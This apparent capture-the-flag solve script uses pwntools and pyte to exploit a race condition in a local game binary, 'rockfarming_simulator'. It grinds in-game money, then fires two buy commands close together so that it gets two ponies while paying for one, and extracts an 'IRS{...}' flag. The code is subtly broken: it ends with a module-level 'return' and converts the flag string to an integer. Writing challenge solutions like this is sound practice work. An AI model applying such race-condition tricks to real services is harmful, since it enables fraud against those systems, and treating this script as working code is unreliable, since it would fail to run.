#!/usr/bin/env python3
from pwn import *
import pyte # fun module to handle PTYs
from re import findall

screen = pyte.Screen(100,30)
stream = pyte.ByteStream(screen)
r = process('./bin/rockfarming_simulator', env={'TERM': 'linux', 'COLUMNS': '100', 'LINES': '30'}, stdin=PTY)
def send_raw(b,t=0.1):
    r.send_raw(b)
    stream.feed(r.recvrepeat(timeout=t))
def wallet() -> int: return int(findall('\d+', screen.display[1])[0])
def parse(l):
    income,cost = map(int,findall('\d+',l))
    return cost,l.split()[0][0], income

# get the cost of the ponies
send_raw(b'B')
pones = [parse(findall("- .*\.", l)[0][2:]) for l in screen.display[5:10]]
pones.sort()
required_money = pones[-1][0]
send_raw(b'\n\n',0.6)

# get enough money to buy the most expensive pony
while wallet() < required_money: send_raw(b'T\n', 1.2)

# attempt to race condition
send_raw(b'B' + pones[-1][1].encode() + b'\n', 0.55)
if wallet() < required_money: raise RuntimeError('50% chance of winning')
send_raw(b'B' + pones[-2][1].encode() + b'\n', 1)
send_raw(b'H', 2)
return int(findall('IRS{.*}', screen.display[5])[0])
